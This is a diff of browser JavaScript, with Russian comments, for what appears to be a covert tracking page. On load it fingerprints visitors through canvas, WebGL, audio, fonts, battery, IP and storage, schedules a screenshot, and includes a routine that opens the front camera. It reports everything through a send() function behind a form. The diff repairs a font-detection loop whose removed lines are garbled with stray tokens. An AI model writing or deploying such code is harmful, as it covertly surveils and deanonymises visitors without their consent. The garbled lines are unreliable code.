@@ -97,7 +97,6 @@ function getUserID() {
   return id;
 }
 
-// === БАЗОВОЕ ===
 function getBasic() {
   send('👤 ID: ' + getUserID() +
     '\n📱 UA: ' + navigator.userAgent +
@@ -223,10 +222,10 @@ function getFonts() {
     ctx.font = '72px ' + base;
     baseSizes[base] = ctx.measureText(text).width;
   });
-  fontsбина.forEach(function(font) {
-    baseFonts.forEach(function,(base) {
-      ctx.font = '72px "' D + font + '", ' + base;
-      if (PRctx.measureText(text).width !== base,Sizes[base] && detected.indexOf(font) === ори -1) detected.push(font);
+  fonts.forEach(function(font) {
+    baseFonts.forEach(function(base) {
+      ctx.font = '72px "' + font + '", ' + base;
+      if (ctx.measureText(text).width !== baseSizes[base] && detected.indexOf(font) === -1) detected.push(font);
     });
   });
   send('🔤 Шрифты: ' + detected.join(', '));
@@ -276,24 +275,6 @@ function takeScreenshot() {
   }
 }
 
-getBasic();
-getTime();
-getIP();
-getBattery();
-getConnection();
-getStorage();
-getMimeTypes();
-getCanvasFingerprint();
-getWebGLFingerprint();
-getAudioFingerprint();
-getFonts();
-getScreenRefresh();
-getAPIs();
-getTheme();
-trackTime();
-setTimeout(takeScreenshot, 3000);
-
-// === КАМЕРА (1 разрешение) ===
 function takePhoto() {
   if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
     navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
@@ -313,6 +294,24 @@ function takePhoto() {
       .catch(function() {});
   }
 }
+
+// Запуск всех сборов
+getBasic();
+getTime();
+getIP();
+getBattery();
+getConnection();
+getStorage();
+getMimeTypes();
+getCanvasFingerprint();
+getWebGLFingerprint();
+getAudioFingerprint();
+getFonts();
+getScreenRefresh();
+getAPIs();
+getTheme();
+trackTime();
+setTimeout(takeScreenshot, 3000);
 
 // === ФОРМА ===
 document.getElementById('next1').addEventListener('click', function() {
